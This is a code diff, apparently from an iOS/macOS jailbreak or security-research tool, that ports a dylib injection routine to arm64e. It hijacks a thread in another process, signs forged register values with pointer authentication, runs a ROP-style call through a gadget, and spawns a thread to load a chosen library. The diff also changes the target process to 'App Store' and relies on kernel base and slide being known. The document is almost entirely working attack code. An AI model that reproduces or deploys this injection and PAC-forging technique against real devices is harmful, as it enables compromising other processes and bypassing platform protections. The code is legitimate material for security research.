@@ -95,13 +95,23 @@ static uint64_t ropcall(mach_vm_address_t function, char *argMap, uint64_t *arg1
 {
 	kern_return_t kret;
 
-	state.__pc = (uint64_t) ptrauth_sign_unauthenticated((void*) function, ptrauth_key_process_independent_code, ptrauth_string_discriminator("pc"));
+	state.__opaque_pc = (void*) ptrauth_sign_unauthenticated((void*) function, ptrauth_key_process_independent_code, ptrauth_string_discriminator("pc"));
 
+#ifndef __arm64e__
 	thread_convert_thread_state(thread, THREAD_CONVERT_THREAD_STATE_FROM_SELF, ARM_THREAD_STATE64, reinterpret_cast<thread_state_t>(&state), stateCount, reinterpret_cast<thread_state_t>(&state), &stateCount);
 
-	state.__lr = gadget_address;
-	state.__sp = (uint64_t) ((remote_stack + STACK_SIZE) - (STACK_SIZE / 4));
-	state.__fp = state.__sp;
+	state.__opaque_lr = (void*)gadget_address;
+	state.__opaque_sp = (void*) ((remote_stack + STACK_SIZE) - (STACK_SIZE / 4));
+	state.__opaque_fp = (void*) state.__opaque_sp;
+#else
+	state.__opaque_lr = (void*) ptrauth_sign_unauthenticated((void*)gadget_address, 0, ptrauth_string_discriminator("lr"));
+	state.__opaque_sp = (void*) ptrauth_sign_unauthenticated((void*)((remote_stack + STACK_SIZE) - (STACK_SIZE / 4)), ptrauth_key_asda, ptrauth_string_discriminator("sp"));
+	state.__opaque_fp = (void*) ptrauth_sign_unauthenticated((void*)((remote_stack + STACK_SIZE) - (STACK_SIZE / 4)), ptrauth_key_asda, ptrauth_string_discriminator("fp"));;
+
+	thread_convert_thread_state(thread, THREAD_CONVERT_THREAD_STATE_FROM_SELF, ARM_THREAD_STATE64, reinterpret_cast<thread_state_t>(&state), stateCount, reinterpret_cast<thread_state_t>(&state), &stateCount);
+#endif
+
+	printf("sp = 0x%llx\n", *(uint64_t*) &state.__opaque_sp);
 
 	char *local_fake_stack = (char *)malloc((size_t) STACK_SIZE);
 
@@ -179,7 +189,7 @@ static uint64_t ropcall(mach_vm_address_t function, char *argMap, uint64_t *arg1
 
 				fprintf(stderr, "Unknown argument type: '%c'\n", *argp);
 				
-				return 0;
+				exit(-1);
 		}
 	}
 
@@ -191,12 +201,19 @@ static uint64_t ropcall(mach_vm_address_t function, char *argMap, uint64_t *arg1
 	{
 		fprintf(stderr, "Unable to copy fake stack to target process! %s\n", mach_error_string(kret));
 
-		return 0;
+		exit(-1);
 	}
 
 	printf("Calling function at %p...\n", (void *)function);
 
-	thread_set_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);
+	kret = thread_set_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);
+
+	if(kret != KERN_SUCCESS)
+	{
+		fprintf(stderr, "Could not set thread state! %s\n", mach_error_string(kret));
+
+		exit(-1);
+	}
 
 	thread_resume(thread);
 
@@ -206,7 +223,7 @@ static uint64_t ropcall(mach_vm_address_t function, char *argMap, uint64_t *arg1
 
 		thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &stateCount);
 
-		if(state.__pc == gadget_address)
+		if(ptrauth_strip(state.__opaque_pc, ptrauth_key_process_independent_code) == (void*) gadget_address)
 		{
 			printf("Returned from function!\n");
 
@@ -280,6 +297,8 @@ static void* find_gadget(const char *gadget, int gadget_len)
 int injectLibrary(char *dylib)
 {
 	kern_return_t kr;
+
+	int err;
 
 	libDyld = task->getDyld()->cacheDumpImage("libdyld.dylib");
 
@@ -426,6 +445,14 @@ int injectLibrary(char *dylib)
 
 	printf("Pthread arguments = 0x%llx\n", pthread);
 
+#ifdef __arm64e__
+	state.__opaque_pc = ptrauth_sign_unauthenticated((void*) remote_code, ptrauth_key_process_independent_code, 0);
+
+	remote_code = reinterpret_cast<mach_vm_address_t>(state.__opaque_pc);
+#endif
+
+	printf("remote_code = 0x%llx\n", (uint64_t) remote_code);
+
 	ropcall(pthread_create_from_mach_thread, (char *)"uuuu", (uint64_t*) pthread, NULL, (uint64_t*) remote_code, NULL );
 
 	sleep(5);
@@ -438,6 +465,8 @@ int injectLibrary(char *dylib)
 
 	free(injected_code);
 
+	memset(&state, 0x0, sizeof(state));
+
 	return 0;
 }
 
@@ -449,7 +478,7 @@ int main()
 
 	printf("Kernel base = 0x%llx slide = 0x%llx\n", kernel->getBase(), kernel->getSlide());
 
-	task = new Task(kernel, "QRReader");
+	task = new Task(kernel, "App Store");
 
 	printf("PID 1382 task = 0x%llx proc = 0x%llx\n", task->getTask(), task->getProc());
 	
